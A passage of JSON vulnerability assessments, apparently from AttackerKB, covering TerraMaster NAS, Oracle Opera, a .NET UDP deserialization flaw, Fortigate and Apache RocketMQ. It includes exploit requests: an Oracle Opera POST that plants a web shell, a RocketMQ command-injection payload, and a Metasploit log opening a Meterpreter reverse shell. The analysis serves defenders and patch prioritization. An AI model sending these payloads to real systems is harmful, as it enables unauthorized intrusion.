repository](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2021_45837.rb)\r\n[TerrorMaster 2 - Metasploit PR 18070](https://github.com/rapid7/metasploit-framework/pull/18070)\r\n[TerrorMaster 1](https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665)\r\n[TerrorMaster 3](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990)\r\n\r\n### Credits\r\n`N0tme`",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "58b6ed47-74d2-4c2b-a1fe-e784cb8749ea",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "c386303d-1ddd-42de-8c36-e27b4f6593ce",
      "created": "2023-06-06T08:04:51.001432Z",
      "revisionDate": "2023-10-16T12:24:32.144938Z",
      "document": "",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Credential Access",
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "47bbcd2b-9572-4c58-8e2e-1b8a2b565410",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "423fd393-8d2e-4431-a33d-e84c63d0c5c9",
      "created": "2023-06-06T17:46:42.338577Z",
      "revisionDate": "2023-06-07T07:19:19.296544Z",
      "document": "# Reasoning Behind Exploitability and Attacker Value\r\n\r\nThis is an unauthenticated remote code execution vulnerability - I'm not exactly sure why NVD gave this a 7.2: `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:L/A:L`, but it seems like an incorrect assessment. The vectors that confuse me in NVD's assessment are:\r\n- Attack Complexity (AC): High \r\n- Privileges Required (PR): High\r\n\r\nIt seems to me these should be `Low` and `None` respectively as privileges are not required to obtain RCE and the attack is not complex. There is a point and shoot unauthenticated RCE PoC publicly available online. If I had to guess why NVD gave it such a low score (if it wasn't a mistake) would be that in order to exploit you need to know the static keys Oracle Opera uses to encrypt strings. However the researchers at AssetNote published the encryption routine with the static keys used by the application in their PoC. \r\n\r\nOracle Opera is a heavily used application and in my opinion this vulnerability should be considered critical.   \r\n\r\n# Vulnerability Details\r\nThis is an order of operations bug in Oracle Opera, a widely used hotel and property management software. The vulnerability stems from an unfortunate developer oversight in the `FileReceiver` endpoint which accepts the parameters and is accessible without authentication:\r\n```java\r\nString filename = SanitizeParameters.sanitizeServletParamOrUrlString(request.getParameter(\"filename\"));\r\nString crc = SanitizeParameters.sanitizeServletParamOrUrlString(request.getParameter(\"crc\"));\r\nString append = SanitizeParameters.sanitizeServletParamOrUrlString(request.getParameter(\"append\"));\r\nString jndiname = DES.decrypt(SanitizeParameters.sanitizeServletParamOrUrlString(request.getParameter(\"jndiname\")));\r\nString username = DES.decrypt(SanitizeParameters.sanitizeServletParamOrUrlString(request.getParameter(\"username\")));\r\n```\r\nThe above two parameters `jndiname` and `username` are both encrypted user controlled input. As you may notice the two parameters are sanitized BEFORE they are decrypted, rendering the sanitization useless. The attacker can then send any payload they wish via those two parameters without them being sanitized. \r\n\r\nFollowing the code path of the `FileReceiver` endpoint the application checks to see if the path is allowed via the following function (where `schemaName` is the `username` parameter accepted from the `FileReceiver` endpoint):\r\n\r\n```java\r\n  public static boolean isAllowedPath(String sourcePath, String schemaName, String fileName) {\r\n    boolean ret = false;\r\n    try {\r\n      if (sourcePath != null && sourcePath.length() > 0 && schemaName != null && schemaName.length() > 0 && fileName != null && fileName.length() > 0) {\r\n        String adjustedSourcePath = (new File(sourcePath + File.separator + schemaName)).getCanonicalPath().toUpperCase();\r\n        String adjustedFileName = (new File(fileName)).getCanonicalPath().toUpperCase();\r\n        if (adjustedFileName.startsWith(adjustedSourcePath)) {\r\n          ret = true;\r\n        } else {\r\n          throw new Exception(\"File[\" + adjustedFileName + \"] is not allowed at[\" + adjustedSourcePath + \"]\");\r\n        } \r\n      } else {\r\n        throw new Exception(\"Either path, schema or filename is null\");\r\n      } \r\n    } catch (Exception e) {\r\n      e.printStackTrace();\r\n    } \r\n    return ret;\r\n  }\r\n```\r\n\r\nWith the line of interest being:\r\n```java\r\n String adjustedSourcePath = (new File(sourcePath + File.separator + schemaName)).getCanonicalPath().toUpperCase();\r\n```\r\nIf  `schemaName` = `\"foo/../../../../../\"`  then `adjustedSourcePath` will be equal to `\"D:\\\"` and the attacker will have the ability to an write arbitrary file to the `D:\\` directory (which is where the Oracle Opera application needs to be installed as per Oracle documentation). \r\n\r\nNow the above explains how to write arbitrary files to the system but not how to obtain unauthenticated RCE. There's still two main blockers: \r\n1. Knowing the JNDI name needed for exploitation.\r\n2. Knowing how to encrypt the `jndiname` and `username` in order for the application (`FileReceiver` endpoint) to be able to decrypt them successfully. \r\n\r\nLuckily for the attacker both of the above issues can easily be resolved. \r\nThe JNDI connection name can be found by visiting the following unauthenticated URLs:\r\n```\r\nhttps://example.com/Operajserv/OXIServlets/CRSStatus?info=true\r\nhttps://example.com/Operajserv/OXIServlets/BEInterface?info=true\r\nhttps://example.com/Operajserv/OXIServlets/ExportReceiver?info=true\r\n```\r\n\r\nAs for the knowing of the encrypted parameters sent to `FileReceiver`, Oracle Opera uses static keys to encrypt strings. The researchers at Assetnote were able to recreate their encryption routine and used it in order to encrypt the necessary parts (`username`, `jndiname`) of the payload.\r\n\r\nThe POST request below uses the arbitrary file upload to drop a CGI web shell onto the local file system that can be accessed remotely to execute commands in the context of the user running the Oracle Opera instance. Perl comes installed with Opera and will be available on the target system making Perl the default choice for a web shell in this scenario. \r\n```http\r\nPOST /Operajserv/webarchive/FileReceiver?filename=D:\\MICROS\\opera\\operaias\\cgi-bin\\80088941a432b4458e492b7686a88da6.cgi&crc=588&trace=ON&copytoexpdir=1&jndiname=0c919bc95270f6921e102ab8ae52e497&username=f56ade9e2d01a95d782dc04e5fa4481309a563c219036e25&append=1 HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.79.1\r\nAccept: */*\r\nContent-Length: 588\r\nContent-Type: multipart/form-data; boundary=------------------------e58fd172ced7d9dc\r\nConnection: close\r\n\r\n<place perl webshell here>\r\n\r\n```\r\n\r\n# References\r\nhttps://blog.assetnote.io/2023/04/30/rce-oracle-opera/\r\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-21932\r\n\r\n\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Impact",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "3d643bc7-c5c7-4b3f-b798-3392325c7bc1",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "cb1ffbcf-1290-46d2-bc00-ee9e6ae181af",
      "created": "2023-06-06T19:09:25.960607Z",
      "revisionDate": "2023-06-07T18:43:54.346387Z",
      "document": "Rating this vulnerability as high value given the ease of exploitation. The `Device-Gateway-Status` process accepts UDP packets without authentication and deserializes its contents, leading to RCE.\r\n\r\nThe .NET deserialization vulnerability occurs at the initial processing of UDP packets in the method `ParseUDPPacket()`.\r\n\r\n![ParseUDPPacket_method](https://user-images.githubusercontent.com/40177151/243779364-1ba77a11-223a-4014-bbc6-0ae1a196d734.png)\r\n\r\nThe method first checks that the first byte of the packet is 1, and then it determines the length of the packet by viewing the second and third bytes. The method will then read all of the contents following the first three bytes into an array, and then `InfraSuiteManager.Common.Serialization.DeSerializeBinary()` is called with the array passed in. We can see that if `DeSerializeBinary()` succeeds, the deserialized contents are assigned to the `sPacketData.sHeader` field.\r\n\r\nThe `DeSerializeBinary()`method calls `BinaryFormatter.Deserialize()` on the packet header, allowing for code execution.\r\n\r\n![DeSerializeBinary_method](https://user-images.githubusercontent.com/40177151/243789146-76bcf6f4-9b46-46f2-95b7-5e7a51d9b412.png)\r\n\r\nSending a UDP packet with just the packet header is valid and will be deserialized, so exploitation is as simple as sending the following over a UDPSocket in Ruby:\r\n\r\n```ruby\r\n\"\\x01#{[ payload.length ].pack('n')}#{payload}\"\r\n```\r\n\r\nThe following ysoserial.net gadget chains work against version `01.00.00d` of the software:\r\n\r\n* ClaimsIdentity\r\n* ClaimsPrincipal\r\n* RolePrincipal\r\n* SessionViewStateHistoryItem\r\n* WindowsIdentity\r\n\r\nOne caveat of exploitation is that it spawns a cmd window. Still encourage prioritizing a patch for this one.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ad164293-135a-4374-ac59-60c92721cd34",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "9b7e4fcc-3b9b-481f-956a-da0ac9fee5cf",
      "created": "2023-06-10T08:21:29.274451Z",
      "revisionDate": "2023-06-12T17:22:38.661275Z",
      "document": "This is the third exploit a.k.a. `TerrorMaster 3` targeting TerraMaster NAS devices running TerraMaster Operating System (TOS) `4.2.29` or lower.\r\n\r\n**Octagon Networks** published in March 2022  an analysis [CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/) explaining a chain of vulnerabilities that makes all TerraMaster NAS servers running TOS version `4.2.29` and lower vulnerable for an unauthenticated RCE.\r\n\r\nIt basically combines [CVE-2022-24990: Leaking sensitive information](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24990) and [CVE-2022-24989: Authenticated remote code execution](https://www.redpacketsecurity.com/terramaster-tos-command-execution-cve-2022-24989/) to achieve an unauthenticated RCE by exploiting vulnerable endpoint `api.php?mobile/webNasIPS` leaking sensitive information such as admin password hash and mac address to achieve unauthenticated access and use the vulnerable endpoint`api.php?mobile/createRaid` with `POST` parameters `raidtype` / `diskstring` to execute remote code as root on TerraMaster NAS devices.\r\n\r\nAs usual, you can find the third module [here](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2022_24990.rb) in my local repository or as [PR 18086](https://github.com/rapid7/metasploit-framework/pull/18086) submitted at the Metasploit Github development.\r\n\r\nWith release of `TOS 5.x`, all of these vulnerabilities are now mitigated, but I would not be surprised that in the near future, some new exploits will come to surface looking back at the ugly history of TerraMaster flaws in the past.\r\n\r\n### Mitigation\r\nPlease update your `TOS version` up to the latest supported `TOS 4.2.x` version or `TOS 5.x` version to be protected against all known vulnerabilities and do  **NOT** to expose your TerraMaster NAS devices directly to the Internet.\r\n\r\n### References\r\n[CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation](https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/)\r\n[POC 0xf4n9x](https://github.com/0xf4n9x/CVE-2022-24990)\r\n[CVE-2022-24990](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24990)\r\n[CVE-2022-24989](https://www.redpacketsecurity.com/terramaster-tos-command-execution-cve-2022-24989/)\r\n[TerrorMaster 3 - h00die-gr3y Metasploit local repository](https://github.com/h00die-gr3y/Metasploit/blob/main/terramaster_unauth_rce_cve_2022_24990.rb)\r\n[TerrorMaster 3 - Metasploit PR 18086](https://github.com/rapid7/metasploit-framework/pull/18086)\r\n[TerrorMaster 1](https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665)\r\n[TerrorMaster 2](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837)\r\n\r\n### Credits\r\n`Octagon Networks`\r\n`0xf4n9x`",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1d7f32a2-70b7-4dd4-be60-a995f402d262",
      "editorId": "5aff6322-7e9a-4bf8-bca8-34008e7a48df",
      "topicId": "7f8c8271-6508-4a33-a3da-868744c5c91c",
      "created": "2023-06-13T07:22:53.361911Z",
      "revisionDate": "2023-06-13T07:25:43.319283Z",
      "document": "This vulnerability is expected to be of very high value as Fortigate SSL VPN vulnerabilities have been exploited in the past, particurlarly by state sponsored or otherwise-motivated IAB actors. Fortinet also predict that whilst there isn't an official link to Volt Typhoon, they do expect the majority of TA's exploiting this vulnerability, Volt Typhoon have been known to exploit prior Fortigate SSL VPN vulns as part of their initial access campaign.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "281edbc6-9115-4a51-8ee1-8e439f50d839",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "c386303d-1ddd-42de-8c36-e27b4f6593ce",
      "created": "2023-06-13T09:23:43.762826Z",
      "revisionDate": "2023-06-13T20:25:13.075198Z",
      "document": "Based on learnings from developing a [RCE exploit](https://github.com/sfewer-r7/CVE-2023-34362),  our [AttackerKB Analysis](https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362#rapid7-analysis), and given additional PoC's are now available publicly I think the exploitability rating for this vulnerability warrants an increase from the original difficult rating.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7407ccd7-a358-406c-933e-3a78e2dcff2e",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "8d5bf478-f112-4c9f-a24a-3c0992ededb0",
      "created": "2023-06-14T21:10:50.813044Z",
      "revisionDate": "2023-09-07T08:33:50.778008Z",
      "document": "# Description\r\n Multiple different components of RocketMQ including the NameServer, Broker, and Controller are by default leaked on the extranet of the network the system is operating within and are accessible without authentication. The vulnerability can be exploited by using the \"update configuration\" function to send arbitrary commands to the system which will be executed in the context of the user running the application. \r\n\r\n# Vulnerable Versions\r\nApache RocketMQ versions vulnerable to RCE (CVE-2023-33246):\r\n- 5.1.0 - 5.0.0 \r\n- <= 4.9.5 \r\n\r\n# Vulnerable Environment\r\nA vulnerable environment can be spun up using the following docker commands. Both the NameServer and Broker containers are required:\r\n```\r\ndocker pull apache/rocketmq:4.9.5\r\ndocker run --rm--name rmqnamesrv -p 9876:9876 apache/rocketmq:4.9.5 sh mqnamesrv\r\ndocker run --rm --name rmqbroker --link rmqnamesrv:namesrv -e \"NAMESRV_ADDR=namesrv:9876\" -p 10909:10909 -p 10911:10911 -p 10912:10912 apache/rocketmq:4.9.5 sh mqbroker -c /home/rocketmq/rocketmq-4.9.5/conf/broker.conf\r\n```\r\n\r\n# Is Windows Vulnerable?\r\nThe short answer: no. Many blogs commented on the Unix PoC and all said \"Apache RocketMQ \" is vulnerable without ever mentioning which platform it had to be running on. So I assumed Windows would be vulnerable as well and went out to try and exploit it. \r\n\r\nThe only difference between the exploitation paths on Windows and Unix is here in `FilterServerManager.buildStartCommand()`, where the command that is sent to `Runtime.getRuntime().exec` gets built:\r\n```\r\n        if (RemotingUtil.isWindowsPlatform()) {\r\n            return String.format(\"start /b %s\\\\bin\\\\mqfiltersrv.exe %s\",\r\n                this.brokerController.getBrokerConfig().getRocketmqHome(),\r\n                config);\r\n        } else {\r\n            return String.format(\"sh %s/bin/startfsrv.sh %s\",\r\n                this.brokerController.getBrokerConfig().getRocketmqHome(),\r\n                config);\r\n        }\r\n```\r\n- Windows entry point `Runtime.getRuntime().exec(\"start /b <PAYLOAD>\")` \r\n- Unix entry point `Runtime.getRuntime().exec(\"sh <PAYLOAD>\")`\r\n\r\nWhen attempting to exploit the vulnerability on windows, in `C:\\Users\\msfuser\\logs\\rocketmq\\logs\\broker.log` I kept seeing the following error:\r\n```\r\njava.io.IOException: Cannot run program \"start\": CreateProcess error=2, The system cannot find the file specified\r\n```\r\nEven when attempting to run the happy path of updating the RocketMQ broker config, same error. That is because you can't use the `start` command directly in the `Runtime.getRuntime().exec()` method in Java. The `start` command is a Windows-specific command and is not recognized by the Java runtime.\r\n\r\nThis is a bug in the RocketMQ implementation. I would have raised an issue with them regarding this had they not ripped out the entire functionality due to the emergence of the vulnerability I'm writing about.  \r\n\r\nYou can try this at home with the following test class:\r\n```\r\npublic class MyClass {\r\n\r\n   public static void main(String[] args) {\r\n      try {\r\n         String[] cmdArray =  {\"start\", \" /b\", \"C:\\\\Windows\\\\System32\\\\notepad.exe\"};  \r\n         Process process = Runtime.getRuntime().exec(cmdArray);\r\n      } catch (Exception ex) {\r\n         ex.printStackTrace();\r\n      }\r\n    }\r\n}\r\n``` \r\nSimply compile, execute and see the following error:\r\n```\r\nD:\\rocketmq>javac MyClass.java\r\nD:\\rocketmq>java MyClass\r\njava.io.IOException: Cannot run program \"start\": CreateProcess error=2, The system cannot find the file specified\r\n        at java.lang.ProcessBuilder.start(Unknown Source)\r\n        at java.lang.Runtime.exec(Unknown Source)\r\n        at java.lang.Runtime.exec(Unknown Source)\r\n        at MyClass.main(MyClass.java:9)\r\nCaused by: java.io.IOException: CreateProcess error=2, The system cannot find the file specified\r\n        at java.lang.ProcessImpl.create(Native Method)\r\n        at java.lang.ProcessImpl.<init>(Unknown Source)\r\n        at java.lang.ProcessImpl.start(Unknown Source)\r\n        ... 4 more\r\n```\r\n\r\n# Exploitation Details\r\nThe [patch diff](https://github.com/apache/rocketmq/commit/c469a60dcca616b077caf2867b64582795ff8bfc) tells a clear story,  the `FilterServerManager` & `FilterServerUtil` classes were completely removed from the application.  Analyzing the code removed we see a potential RCE entry point `Runtime.getRuntime().exec(cmdArray)`,  inside `FilterServerUtil.callShell()`:\r\n```\r\npublic class FilterServerUtil {\r\n    public static void callShell(final String shellString, final InternalLogger log) {\r\n        Process process = null;\r\n        try {\r\n            String[] cmdArray = splitShellString(shellString);\r\n            process = Runtime.getRuntime().exec(cmdArray);\r\n            process.waitFor();\r\n            log.info(\"CallShell: <{}> OK\", shellString);\r\n        } catch (Throwable e) {\r\n            log.error(\"CallShell: readLine IOException, {}\", shellString, e);\r\n        } finally {\r\n            if (null != process)\r\n                process.destroy();\r\n        }\r\n    }\r\n\r\n    private static String[] splitShellString(final String shellString) {\r\n        return shellString.split(\" \");\r\n    }\r\n}\r\n```\r\nWorking backwards from there we can see `callShell` is called from: `FilterServerManager.createFilterServer()`:\r\n```\r\n    public void createFilterServer() {\r\n        int more =\r\n            this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();\r\n        String cmd = this.buildStartCommand();\r\n        for (int i = 0; i < more; i++) {\r\n            FilterServerUtil.callShell(cmd, log);\r\n        }\r\n    }\r\n```\r\n\r\nThe `createFilterServer()` method will be called every 30 seconds according to the inside of the `FilterServerManager.start()`\r\n```\r\n    public void start() {\r\n\r\n        this.scheduledExecutorService.scheduleAtFixedRate(new Runnable() {\r\n            @Override\r\n            public void run() {\r\n                try {\r\n                    FilterServerManager.this.createFilterServer();\r\n                } catch (Exception e) {\r\n                    log.error(\"\", e);\r\n                }\r\n            }\r\n        }, 1000 * 5, 1000 * 30, TimeUnit.MILLISECONDS);\r\n    }\r\n\r\n```\r\nThe command that gets executed by `Runtime.getRuntime().exec` is created by the following method `FilterServerManager.buildStartCommand()`. We see from the last `else` block if the system we're exploit is not Windows, the command run will be `sh %s ...` where `%s` get substituted for `getRocketmqHome()` which is an user controlled parameter when the user sends a request to update the broker configuration.\r\n```\r\n    private String buildStartCommand() {\r\n        String config = \"\";\r\n        if (BrokerStartup.configFile != null) {\r\n            config = String.format(\"-c %s\", BrokerStartup.configFile);\r\n        }\r\n\r\n        if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {\r\n            config += String.format(\" -n %s\", this.brokerController.getBrokerConfig().getNamesrvAddr());\r\n        }\r\n\r\n        if (RemotingUtil.isWindowsPlatform()) {\r\n            return String.format(\"start /b %s\\\\bin\\\\mqfiltersrv.exe %s\",\r\n                this.brokerController.getBrokerConfig().getRocketmqHome(),\r\n                config);\r\n        } else {\r\n            return String.format(\"sh %s/bin/startfsrv.sh %s\",\r\n                this.brokerController.getBrokerConfig().getRocketmqHome(),\r\n                config);\r\n        }\r\n    }\r\n```\r\n\r\nBelow is the request that can be sent to the Broker component of ApacheMQ to update the broker configuration or to obtain remote code execution. (note the payload inside of the `rocketmqHome` parameter also the binary header required to exploit is not included in the payload below) \r\n\r\n```\r\n`{\"code\":25,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}filterServerNums=1\r\nrocketmqHome=-c $@|sh . echo <Unix payload of your choice :)>`\r\n```\r\n\r\nThere is one more aspect of the vulnerability that should be noted, above in `callShell` you'll notice the following two lines:\r\n```\r\n            String[] cmdArray = splitShellString(shellString);\r\n            process = Runtime.getRuntime().exec(cmdArray);\r\n```\r\n`FilterServerUtil.splitShellString(final String shellString)` is defined as the following: \r\n```\r\n    private static String[] splitShellString(final String shellString) {\r\n        return shellString.split(\" \");\r\n    }\r\n```\r\n\r\nThis means if the incoming command includes a space it will be split into an array and the first element of the array will be the command (ex: `sh`) and the rest of the elements of the array will be the arguments to that command. Getting a long string of multiple commands which all contain spaces to execute, is an exercise in ShellFu:\r\n```\r\n-c $@|sh . echo <PAYLOAD CONTAINING SPACES>\r\n```\r\n\r\nThe argument `$@` represents all the parameters passed to the script or command and directly passes the value after echo to `$@` as a whole which solves the issue introduced by `shellString.split`\r\n\r\n# Metasploit Exploitation\r\nBelow is an example of a vulnerable RocketMQ instance being targeted by the `apache_rocketmq_update_config` metasploit module in order to establish a Meterpreter session in the context of the `rocketmq` user.\r\n```\r\nmsf6 > use multi/http/apache_rocketmq_update_config\r\n[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp\r\nmsf6 exploit(multi/http/apache_rocketmq_update_config) > set rhosts 127.0.0.1\r\nrhosts => 127.0.0.1\r\nmsf6 exploit(multi/http/apache_rocketmq_update_config) > set lhost 172.16.199.158\r\nlhost => 172.16.199.158\r\nmsf6 exploit(multi/http/apache_rocketmq_update_config) > set FETCH_SRVHOST 172.16.199.158\r\nFETCH_SRVHOST => 172.16.199.158\r\nmsf6 exploit(multi/http/apache_rocketmq_update_config) > run\r\n\r\n[*] Started reverse TCP handler on 172.16.199.158:4444\r\n[*] 127.0.0.1:9876 - Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] 127.0.0.1:9876 - The target appears to be vulnerable. RocketMQ version: 4.9.4\r\n[*] 127.0.0.1:9876 - autodetection failed, assuming default port of 10911\r\n[*] 127.0.0.1:9876 - Executing target: Automatic (Unix In-Memory) with payload cmd/linux/http/x64/meterpreter/reverse_tcp on Broker port: 10911\r\n[+] 127.0.0.1:9876 - Payload length: 252, (must not exceed 255 characters)\r\n[*] Sending stage (3045348 bytes) to 172.17.0.3\r\n[*] Meterpreter session 1 opened (172.16.199.158:4444 -> 172.17.0.3:37576) at 2023-06-27 14:49:18 -0700\r\n\r\nmeterpreter > getuid\r\nServer username: rocketmq\r\nmeterpreter > sysinfo\r\nComputer     : 172.17.0.3\r\nOS           : CentOS 7.9.2009 (Linux 5.15.0-75-generic)\r\nArchitecture : x64\r\nBuildTuple   : x86_64-linux-musl\r\nMeterpreter  : x64/linux\r\nmeterpreter >\r\n```\r\n\r\n# AKB Rating Explanation  \r\nThe Broker component by default listens on the extranet on port `10911`.  This vulnerable endpoint shouldn't be exposed to the internet by default and is why I decided to go with a lower attacker value. However, if an attacker is already in the network this vuln is easily exploitable and provides an excellent pivot point. \r\n\r\n# References\r\nhttps://blogs.juniper.net/en-us/threat-research/cve-2023-33246-apache-rocketmq-remote-code-execution-vulnerability\r\nhttps://blog.csdn.net/qq_41904294/article/details/130987233",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
